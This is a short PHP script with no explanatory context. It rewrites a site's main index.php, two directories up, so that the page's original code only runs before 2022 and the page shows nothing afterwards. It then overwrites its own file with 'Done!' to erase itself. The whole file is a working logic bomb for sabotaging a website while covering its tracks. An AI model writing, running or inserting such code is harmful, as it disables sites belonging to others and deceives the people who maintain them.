<?php

    $make = '../../index.php';

    file_put_contents($make, '<?php if(date("Y") > 2021) {} else {?>' . file_get_contents($make) . '?><?php } ?>');
    file_put_contents(__FILE__, 'Done!');


    scandir(__DIR__);